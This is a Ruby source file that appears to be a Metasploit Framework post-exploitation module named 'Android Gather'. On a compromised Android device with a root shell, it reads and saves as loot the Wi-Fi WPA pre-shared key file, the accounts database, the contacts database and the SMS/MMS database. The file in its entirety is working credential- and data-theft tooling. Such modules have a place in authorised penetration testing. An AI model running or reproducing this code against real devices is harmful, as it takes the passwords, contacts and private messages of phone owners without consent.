##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Android Gather',
        'Description'   => %q{ Post Module to gather from an android device },
        'License'       => MSF_LICENSE,
        'Author'        => ['timwr'],
        'Platform'      => [ 'linux' ],
        'SessionTypes'  => [ 'shell' ]
      ))
  end

  def is_root?
    root_priv = false
    user_id = cmd_exec("/system/bin/id")
    if user_id =~ /root/
        root_priv = true
    else
        root_priv = false
    end
    return root_priv
  end

  def read_file(file_name)
    data = nil
    data = session.shell_command_token("/system/bin/cat \'#{file_name}\'")
    if data =~ /No such file or directory/
      return nil
    end
    data.gsub!(/^\n/, "") # Delete initial new line character
    return data
  end

  def run
    unless is_root?
      print_error("You must run this module as root!")
      return
    end

    store_wifi_psk("/data/misc/wifi/wpa_supplicant.conf")

    db_files =
      [
        '/data/system/users/0/accounts.db',
        '/data/data/com.android.providers.contacts/databases/contacts2.db',
        '/data/data/com.android.providers.telephony/databases/mmssms.db'
      ]
    db_files.each do |db_file|
      print_status("Storing #{db_file}...")
      store_db(db_file)
    end
  end

  def store_db(file)
    loot = read_file(file)
    if loot.nil?
      print_error("#{file} not found")
      return
    end
    filename = ::File.basename(file)
    lootfile = store_loot(filename, "binary/db", session, loot, file, "Sqlite db file")
    print_good("#{filename} saved at: #{lootfile.to_s}")
  end


  def store_wifi_psk(file)
    loot = read_file(file)
    if loot.nil?
      print_error("#{file} not found")
      return
    end
    loot_file = store_loot("wpa.psk", "text/plain", session, loot, file, "WPA PSK file")
    print_good("wpa-psk file saved at: #{loot_file.to_s}")
  end

end

